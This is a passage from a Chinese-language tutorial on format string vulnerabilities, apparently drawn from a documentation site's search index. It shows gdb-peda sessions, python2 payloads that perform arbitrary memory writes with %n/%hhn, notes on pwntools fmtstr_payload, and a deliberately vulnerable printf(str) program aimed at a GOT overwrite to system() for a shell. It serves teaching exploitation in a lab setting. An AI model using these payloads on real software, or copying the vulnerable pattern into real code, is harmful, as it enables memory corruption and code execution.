gdb-peda$ r < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0x31254141 0x416e2435 0xffffd56c: 0xffffd538 0xffffd500 0x00000001 0x000000c2 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x7 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x2 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 (\"AA%15$nA8\\325\\377\\377\") 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x00000002 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0x31254141 0x416e2435 0xffffd538 0xffffd570: 0xffffd500 0x00000001 0x000000c2 0xf7e70240 \u5bf9\u6bd4 printf() \u51fd\u6570\u6267\u884c\u524d\u540e\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6210\u529f\u5730\u7ed9 arg2 \u8d4b\u503c\u4e86 0x00000002 \u3002 \u8bf4\u5b8c\u4e86\u6570\u5b57\u5c0f\u4e8e 4 \u65f6\u7684\u8986\u76d6\uff0c\u63a5\u4e0b\u6765\u8bf4\u8bf4\u5927\u6570\u5b57\u7684\u8986\u76d6\u3002\u524d\u9762\u7684\u65b9\u6cd5\u6559\u6211\u4eec\u76f4\u63a5\u8f93\u5165\u4e00\u4e2a\u5730\u5740\u7684\u5341\u8fdb\u5236\u5c31\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\uff0c\u53ef\u662f\uff0c\u8fd9\u6837\u5360\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u592a\u5927\uff0c\u5f80\u5f80\u4f1a\u8986\u76d6\u6389\u5176\u4ed6\u91cd\u8981\u7684\u5730\u5740\u800c\u4ea7\u751f\u9519\u8bef\u3002\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u957f\u5ea6\u4fee\u9970\u7b26\u6765\u66f4\u6539\u5199\u5165\u7684\u503c\u7684\u5927\u5c0f\uff1a char c; short s; int i; long l; long long ll; printf(\"%s %hhn\\n\", str, &c); // \u5199\u5165\u5355\u5b57\u8282 printf(\"%s %hn\\n\", str, &s); // \u5199\u5165\u53cc\u5b57\u8282 printf(\"%s %n\\n\", str, &i); // \u5199\u51654\u5b57\u8282 printf(\"%s %ln\\n\", str, &l); // \u5199\u51658\u5b57\u8282 printf(\"%s %lln\\n\", str, &ll); // \u5199\u516516\u5b57\u8282 \u8bd5\u4e00\u4e0b\uff1a $ python2 -c 'print(\"A%15$hhn\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x88888801 0xffffffff $ python2 -c 'print(\"A%15$hnA\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x88880001 0xffffffff $ python2 -c 'print(\"A%15$nAA\"+\"\\x38\\xd5\\xff\\xff\")' > text 0xffffd530: 0xffffd564 0x00000001 0x00000001 0xffffffff \u4e8e\u662f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u9010\u5b57\u8282\u5730\u8986\u76d6\uff0c\u4ece\u800c\u5927\u5927\u8282\u7701\u4e86\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u91cc\u6211\u4eec\u5c1d\u8bd5\u5199\u5165 0x12345678 \u5230\u5730\u5740 0xffffd538 \uff0c\u9996\u5148\u4f7f\u7528 AAAABBBBCCCCDDDD \u4f5c\u4e3a\u8f93\u5165\uff1a gdb-peda$ r AAAABBBBCCCCDDDD [----------------------------------registers-----------------------------------] EAX: 0xffffd564 (\"AAAABBBBCCCCDDDD\") EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 (\"AAAABBBBCCCCDDDD\") 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 (\"AAAABBBBCCCCDDDD\") 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0x41414141 0x42424242 0xffffd56c: 0x43434343 0x44444444 0x00000000 0x000000c2 gdb-peda$ x/4wb 0xffffd538 0xffffd538: 0x88 0x88 0x88 0x88 \u7531\u4e8e\u6211\u4eec\u60f3\u8981\u9010\u5b57\u8282\u8986\u76d6\uff0c\u5c31\u9700\u8981 4 \u4e2a\u7528\u4e8e\u8df3\u8f6c\u7684\u5730\u5740\uff0c4 \u4e2a\u5199\u5165\u5730\u5740\u548c 4 \u4e2a\u503c\uff0c\u5bf9\u5e94\u5173\u7cfb\u5982\u4e0b\uff08\u5c0f\u7aef\u5e8f\uff09\uff1a 0xffffd564 -> 0x41414141 (0xffffd538) -> \\x78 0xffffd568 -> 0x42424242 (0xffffd539) -> \\x56 0xffffd56c -> 0x43434343 (0xffffd53a) -> \\x34 0xffffd570 -> 0x44444444 (0xffffd53b) -> \\x12 \u628a AAAA \u3001 BBBB \u3001 CCCC \u3001 DDDD \u5360\u636e\u7684\u5730\u5740\u5206\u522b\u66ff\u6362\u6210\u62ec\u53f7\u4e2d\u7684\u503c\uff0c\u518d\u9002\u5f53\u4f7f\u7528\u586b\u5145\u5b57\u8282\u4f7f 8 \u5b57\u8282\u5bf9\u9f50\u5c31\u53ef\u4ee5\u4e86\u3002\u6784\u9020\u8f93\u5165\u5982\u4e0b\uff1a $ python2 -c 'print(\"\\x38\\xd5\\xff\\xff\"+\"\\x39\\xd5\\xff\\xff\"+\"\\x3a\\xd5\\xff\\xff\"+\"\\x3b\\xd5\\xff\\xff\"+\"%104c%13$hhn\"+\"%222c%14$hhn\"+\"%222c%15$hhn\"+\"%222c%16$hhn\")' > text \u5176\u4e2d\u524d\u56db\u4e2a\u90e8\u5206\u662f 4 \u4e2a\u5199\u5165\u5730\u5740\uff0c\u5360 4*4=16 \u5b57\u8282\uff0c\u540e\u9762\u56db\u4e2a\u90e8\u5206\u5206\u522b\u7528\u4e8e\u5199\u5165\u5341\u516d\u8fdb\u5236\u6570\uff0c\u7531\u4e8e\u4f7f\u7528\u4e86 hh \uff0c\u6240\u4ee5\u53ea\u4f1a\u4fdd\u7559\u4e00\u4e2a\u5b57\u8282 0x78 \uff0816+104=120 -> 0x78\uff09\u3001 0x56 \uff08120+222=342 -> 0x0156 -> 0x56\uff09\u3001 0x34 \uff08342+222=564 -> 0x0234 -> 0x34\uff09\u3001 0x12 \uff08564+222=786 -> 0x312 -> 0x12\uff09\u3002\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a $ gdb -q a.out Reading symbols from a.out...(no debugging symbols found)...done. gdb-peda$ b printf Breakpoint 1 at 0x8048350 gdb-peda$ r < text Starting program: /home/firmy/Desktop/RE4B/a.out < text [----------------------------------registers-----------------------------------] EAX: 0xffffd564 --> 0xffffd538 --> 0x88888888 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x1 EDX: 0xf7f9883c --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) EIP: 0xf7e27c20 (<printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax>) EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0xf7e27c1b <fprintf+27>: ret 0xf7e27c1c: xchg ax,ax 0xf7e27c1e: xchg ax,ax => 0xf7e27c20 <printf>: call 0xf7f06d17 <__x86.get_pc_thunk.ax> 0xf7e27c25 <printf+5>: add eax,0x16f243 0xf7e27c2a <printf+10>: sub esp,0xc 0xf7e27c2d <printf+13>: mov eax,DWORD PTR [eax+0x124] 0xf7e27c33 <printf+19>: lea edx,[esp+0x14] No argument [------------------------------------stack-------------------------------------] 0000| 0xffffd52c --> 0x8048520 (<main+138>: add esp,0x20) 0004| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0008| 0xffffd534 --> 0x1 0012| 0xffffd538 --> 0x88888888 0016| 0xffffd53c --> 0xffffffff 0020| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0024| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x88888888 0028| 0xffffd548 --> 0x80481fc --> 0x38 ('8') [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 gdb-peda$ x/20x $esp 0xffffd52c: 0x08048520 0xffffd564 0x00000001 0x88888888 0xffffd53c: 0xffffffff 0xffffd55a 0xffffd564 0x080481fc 0xffffd54c: 0x080484b0 0xf7ffda54 0x00000001 0x424135d0 0xffffd55c: 0x00004443 0x00000000 0xffffd538 0xffffd539 0xffffd56c: 0xffffd53a 0xffffd53b 0x34303125 0x33312563 gdb-peda$ finish Run till exit from #0 0xf7e27c20 in printf () from /usr/lib32/libc.so.6 [----------------------------------registers-----------------------------------] EAX: 0x312 EBX: 0x804a000 --> 0x8049f14 --> 0x1 ECX: 0x0 EDX: 0xf7f98830 --> 0x0 ESI: 0xf7f96e68 --> 0x1bad90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 EIP: 0x8048520 (<main+138>: add esp,0x20) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048514 <main+126>: lea eax,[ebp-0x94] 0x804851a <main+132>: push eax 0x804851b <main+133>: call 0x8048350 <printf@plt> => 0x8048520 <main+138>: add esp,0x20 0x8048523 <main+141>: sub esp,0xc 0x8048526 <main+144>: push 0xa 0x8048528 <main+146>: call 0x8048370 <putchar@plt> 0x804852d <main+151>: add esp,0x10 [------------------------------------stack-------------------------------------] 0000| 0xffffd530 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 0004| 0xffffd534 --> 0x1 0008| 0xffffd538 --> 0x12345678 0012| 0xffffd53c --> 0xffffffff 0016| 0xffffd540 --> 0xffffd55a (\"ABCD\") 0020| 0xffffd544 --> 0xffffd564 --> 0xffffd538 --> 0x12345678 0024| 0xffffd548 --> 0x80481fc --> 0x38 ('8') 0028| 0xffffd54c --> 0x80484b0 (<main+26>: add ebx,0x1b50) [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x08048520 in main () gdb-peda$ x/20x $esp 0xffffd530: 0xffffd564 0x00000001 0x12345678 0xffffffff 0xffffd540: 0xffffd55a 0xffffd564 0x080481fc 0x080484b0 0xffffd550: 0xf7ffda54 0x00000001 0x424135d0 0x00004443 0xffffd560: 0x00000000 0xffffd538 0xffffd539 0xffffd53a 0xffffd570: 0xffffd53b 0x34303125 0x33312563 0x6e686824 \u6700\u540e\u8fd8\u5f97\u5f3a\u8c03\u4e24\u70b9\uff1a \u9996\u5148\u662f\u9700\u8981\u5173\u95ed\u6574\u4e2a\u7cfb\u7edf\u7684 ASLR \u4fdd\u62a4\uff0c\u8fd9\u53ef\u4ee5\u4fdd\u8bc1\u6808\u5728 gdb \u73af\u5883\u4e2d\u548c\u76f4\u63a5\u8fd0\u884c\u4e2d\u90fd\u4fdd\u6301\u4e0d\u53d8\uff0c\u4f46\u8fd9\u4e24\u4e2a\u6808\u5730\u5740\u4e0d\u4e00\u5b9a\u76f8\u540c \u5176\u6b21\u56e0\u4e3a\u5728 gdb \u8c03\u8bd5\u73af\u5883\u4e2d\u7684\u6808\u5730\u5740\u548c\u76f4\u63a5\u8fd0\u884c\u7a0b\u5e8f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7ed3\u5408\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8bfb\u53d6\u5185\u5b58\uff0c\u5148\u6cc4\u9732\u4e00\u4e2a\u5730\u5740\u51fa\u6765\uff0c\u7136\u540e\u6839\u636e\u6cc4\u9732\u51fa\u6765\u7684\u5730\u5740\u8ba1\u7b97\u5b9e\u9645\u5730\u5740","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"Tutorial/Material/Binary%20Exploitation/#x86-64","text":"\u5728 x64 \u4f53\u7cfb\u4e2d\uff0c\u591a\u6570\u8c03\u7528\u60ef\u4f8b\u90fd\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\u3002\u5728 Linux \u4e0a\uff0c\u524d\u516d\u4e2a\u53c2\u6570\u901a\u8fc7 RDI \u3001 RSI \u3001 RDX \u3001 RCX \u3001 R8 \u548c R9 \u4f20\u9012\uff1b\u800c\u5728 Windows \u4e2d\uff0c\u524d\u56db\u4e2a\u53c2\u6570\u901a\u8fc7 RCX \u3001 RDX \u3001 R8 \u548c R9 \u6765\u4f20\u9012\u3002 \u8fd8\u662f\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6b21\u6211\u4eec\u628a\u5b83\u7f16\u8bd1\u6210 64 \u4f4d\uff1a $ gcc -fno-stack-protector -no-pie fmt.c \u4f7f\u7528 AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p. \u4f5c\u4e3a\u8f93\u5165\uff1a gdb-peda$ n [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0xffffffff RDX: 0x88888888 RSI: 0x1 RDI: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") RBP: 0x7fffffffe460 --> 0x400660 (<__libc_csu_init>: push r15) RSP: 0x7fffffffe3c0 --> 0x4241000000000000 ('') RIP: 0x400648 (<main+113>: call 0x4004e0 <printf@plt>) R8 : 0x7fffffffe3c6 --> 0x44434241 ('ABCD') R9 : 0xa ('\\n') R10: 0x7ffff7dd4380 --> 0x7ffff7dd0640 --> 0x7ffff7b9ed3a --> 0x636d656d5f5f0043 ('C') R11: 0x246 R12: 0x400500 (<_start>: xor ebp,ebp) R13: 0x7fffffffe540 --> 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x40063d <main+102>: mov r8,rdi 0x400640 <main+105>: mov rdi,rax 0x400643 <main+108>: mov eax,0x0 => 0x400648 <main+113>: call 0x4004e0 <printf@plt> 0x40064d <main+118>: mov edi,0xa 0x400652 <main+123>: call 0x4004d0 <putchar@plt> 0x400657 <main+128>: nop 0x400658 <main+129>: leave Guessed arguments: arg[0]: 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") arg[1]: 0x1 arg[2]: 0x88888888 arg[3]: 0xffffffff arg[4]: 0x7fffffffe3c6 --> 0x44434241 ('ABCD') [------------------------------------stack-------------------------------------] 0000| 0x7fffffffe3c0 --> 0x4241000000000000 ('') 0008| 0x7fffffffe3c8 --> 0x4443 ('CD') 0016| 0x7fffffffe3d0 (\"AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") 0024| 0x7fffffffe3d8 (\"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\") 0032| 0x7fffffffe3e0 (\".%p.%p.%p.%p.%p.%p.%p.\") 0040| 0x7fffffffe3e8 (\"p.%p.%p.%p.%p.\") 0048| 0x7fffffffe3f0 --> 0x2e70252e7025 ('%p.%p.') 0056| 0x7fffffffe3f8 --> 0x1 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x0000000000400648 in main () gdb-peda$ x/10g $rsp 0x7fffffffe3c0: 0x4241000000000000 0x0000000000004443 0x7fffffffe3d0: 0x4141414141414141 0x70252e70252e7025 0x7fffffffe3e0: 0x252e70252e70252e 0x2e70252e70252e70 0x7fffffffe3f0: 0x00002e70252e7025 0x0000000000000001 0x7fffffffe400: 0x0000000000f0b5ff 0x00000000000000c2 gdb-peda$ c Continuing. AAAAAAAA0x1.0x88888888.0xffffffff.0x7fffffffe3c6.0xa.0x4241000000000000.0x4443.0x4141414141414141.0x70252e70252e7025.0x252e70252e70252e. \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u6700\u540e\u7684\u8f93\u51fa\u4e2d\uff0c\u524d\u4e94\u4e2a\u6570\u5b57\u5206\u522b\u6765\u81ea\u5bc4\u5b58\u5668 RSI \u3001 RDX \u3001 RCX \u3001 R8 \u548c R9 \uff0c\u540e\u9762\u7684\u6570\u5b57\u624d\u53d6\u81ea\u6808\uff0c 0x4141414141414141 \u5728 %8$p \u7684\u4f4d\u7f6e\u3002\u8fd9\u91cc\u8fd8\u6709\u4e2a\u5730\u65b9\u8981\u6ce8\u610f\uff0c\u6211\u4eec\u524d\u9762\u8bf4\u7684 Linux \u6709 6 \u4e2a\u5bc4\u5b58\u5668\u7528\u4e8e\u4f20\u9012\u53c2\u6570\uff0c\u53ef\u662f\u8fd9\u91cc\u53ea\u8f93\u51fa\u4e86 5 \u4e2a\uff0c\u539f\u56e0\u662f\u6709\u4e00\u4e2a\u5bc4\u5b58\u5668 RDI \u88ab\u7528\u4e8e\u4f20\u9012\u683c\u5f0f\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u4ece gdb \u4e2d\u770b\u5230\uff0c arg[0] \u5c31\u662f\u7531 RDI \u4f20\u9012\u7684\u683c\u5f0f\u5b57\u7b26\u4e32\u3002\uff08\u73b0\u5728\u4f60\u53ef\u4ee5\u518d\u56de\u5230 x86 \u7684\u76f8\u5173\u5185\u5bb9\uff0c\u53ef\u4ee5\u770b\u5230\u5728 x86 \u4e2d\u683c\u5f0f\u5b57\u7b26\u4e32\u901a\u8fc7\u6808\u4f20\u9012\u7684\uff0c\u4f46\u662f\u540c\u6837\u7684\u4e5f\u4e0d\u4f1a\u88ab\u6253\u5370\u51fa\u6765\uff09\u5176\u4ed6\u7684\u64cd\u4f5c\u548c x86 \u6ca1\u6709\u4ec0\u4e48\u5927\u7684\u533a\u522b\uff0c\u53ea\u662f\u8fd9\u65f6\u6211\u4eec\u5c31\u4e0d\u80fd\u4fee\u6539 arg2 \u7684\u503c\u4e86\uff0c\u56e0\u4e3a\u5b83\u88ab\u5b58\u5165\u4e86\u5bc4\u5b58\u5668\u4e2d\u3002","title":"x86-64 \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"Tutorial/Material/Binary%20Exploitation/#ctf","text":"","title":"CTF \u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"Tutorial/Material/Binary%20Exploitation/#pwntools-pwnlibfmtstr","text":"\u6587\u6863\u5730\u5740\uff1ahttp://pwntools.readthedocs.io/en/stable/fmtstr.html \u8be5\u6a21\u5757\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u5de5\u5177\u3002\u8be5\u6a21\u5757\u4e2d\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b FmtStr \u548c\u4e00\u4e2a\u51fd\u6570 fmtstr_payload \u3002 FmtStr \u63d0\u4f9b\u4e86\u81ea\u52a8\u5316\u7684\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\uff1a class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0) execute_fmt (function)\uff1a\u4e0e\u6f0f\u6d1e\u8fdb\u7a0b\u8fdb\u884c\u4ea4\u4e92\u7684\u51fd\u6570 offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf padlen (int)\uff1a\u5728 paylod \u4e4b\u524d\u6dfb\u52a0\u7684 pad \u7684\u5927\u5c0f numbwritten (int)\uff1a\u5df2\u7ecf\u5199\u5165\u7684\u5b57\u8282\u6570 fmtstr_payload \u7528\u4e8e\u81ea\u52a8\u751f\u6210\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 paylod\uff1a pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') offset (int)\uff1a\u4f60\u63a7\u5236\u7684\u7b2c\u4e00\u4e2a\u683c\u5f0f\u5316\u7a0b\u5e8f\u7684\u504f\u79fb\u91cf writes (dict)\uff1a\u683c\u5f0f\u4e3a {addr: value, addr2: value2}\uff0c\u7528\u4e8e\u5f80 addr \u91cc\u5199\u5165 value \u7684\u503c\uff08\u5e38\u7528\uff1a{printf_got}\uff09 numbwritten (int)\uff1a\u5df2\u7ecf\u7531 printf \u51fd\u6570\u5199\u5165\u7684\u5b57\u8282\u6570 write_size (str)\uff1a\u5fc5\u987b\u662f byte\uff0cshort \u6216 int\u3002\u544a\u8bc9\u4f60\u662f\u8981\u9010 byte \u5199\uff0c\u9010 short \u5199\u8fd8\u662f\u9010 int \u5199\uff08hhn\uff0chn\u6216n\uff09 \u6211\u4eec\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u719f\u6089\u4e0b\u8be5\u6a21\u5757\u7684\u4f7f\u7528\uff08\u4efb\u610f\u5730\u5740\u5185\u5b58\u8bfb\u5199\uff09\uff1a fmt.c fmt #include<stdio.h> void main() { char str[1024]; while(1) { memset(str, '\\0', 1024); read(0, str, 1024); printf(str); fflush(stdout); } } \u4e3a\u4e86\u7b80\u5355\u4e00\u70b9\uff0c\u6211\u4eec\u5173\u95ed ASLR\uff0c\u5e76\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7f16\u8bd1\uff0c\u5173\u95ed PIE\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u7684 .text .bss \u7b49\u6bb5\u7684\u5185\u5b58\u5730\u5740\u56fa\u5b9a\uff1a # echo 0 > /proc/sys/kernel/randomize_va_space $ gcc -m32 -fno-stack-protector -no-pie fmt.c \u5f88\u660e\u663e\uff0c\u7a0b\u5e8f\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u7684\u601d\u8def\u662f\u5c06 printf() \u51fd\u6570\u7684\u5730\u5740\u6539\u6210 system() \u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u6837\u5f53\u6211\u4eec\u518d\u6b21\u8f93\u5165 /bin/sh \u65f6\uff0c\u5c31\u53ef\u4ee5\u83b7\u5f97 shell \u4e86\u3002 \u7b2c\u4e00\u6b65\u5148\u8ba1\u7b97\u504f\u79fb\uff0c\u867d\u7136 pwntools \u4e2d\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u6784\u9020\u51fa exp\uff0c\u4f46\u8fd9\u91cc\uff0c\u6211\u4eec\u8fd8\u662f\u5148\u6f14\u793a\u624b\u5de5\u65b9\u6cd5\u600e\u4e48\u505a\uff0c\u6700\u540e\u518d\u7528 pwntools \u7684\u65b9\u6cd5\u3002\u5728 gdb \u4e2d\uff0c\u5148\u5728 main \u5904\u4e0b\u65ad\u70b9\uff0c\u8fd0\u884c\u7a0b\u5e8f\uff0c\u8fd9\u65f6 libc \u5df2\u7ecf\u88ab\u52a0\u8f7d\u8fdb\u6765\u4e86\u3002\u6211\u4eec\u8f93\u5165 \"AAAA\" \u8bd5\u4e00\u4e0b\uff1a gdb-peda$ b main ... gdb-peda$ r ... gdb-peda$ n [----------------------------------registers-----------------------------------] EAX: 0xffffd1f0 (\"AAAA\\n\") EBX: 0x804a000 --> 0x8049f10 --> 0x1 ECX: 0xffffd1f0 (\"AAAA\\n\") EDX: 0x400 ESI: 0xf7f97000 --> 0x1bbd90 EDI: 0x0 EBP: 0xffffd5f8 --> 0x0 ESP: 0xffffd1e0 --> 0xffffd1f0 (\"AAAA\\n\") EIP: 0x8048512 (<main+92>: call 0x8048370 <printf@plt>) EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x8048508 <main+82>: sub esp,0xc 0x804850b <main+85>: lea eax,[ebp-0x408] 0x8048511 <main+91>: push eax => 0x8048512 <main+92>: call 0x8048370 <printf@plt> 0x8048517 <main+97>: add esp,0x10 0x804851a <main+100>: mov eax,DWORD PTR [ebx-0x4] 0x8048520 <main+106>: mov eax,DWORD PTR [eax] 0x8048522 <main+108>: sub esp,0xc Guessed arguments: arg[0]: 0xffffd1f0 (\"AAAA\\n\") [------------------------------------stack-------------------------------------] 0000| 0xffffd1e0 --> 0xffffd1f0 (\"AAAA\\n\") 0004| 0xffffd1e4 --> 0xffffd1f0 (\"AAAA\\n\") 0008| 0xffffd1e8 --> 0x400 0012| 0xffffd1ec --> 0x80484d0 (<main+26>: add ebx,0x1b30) 0016| 0xffffd1f0 (\"AAAA\\n\") 0020| 0xffffd1f4 --> 0xa ('\\n') 0024| 0xffffd1f8 --> 0x0 0028| 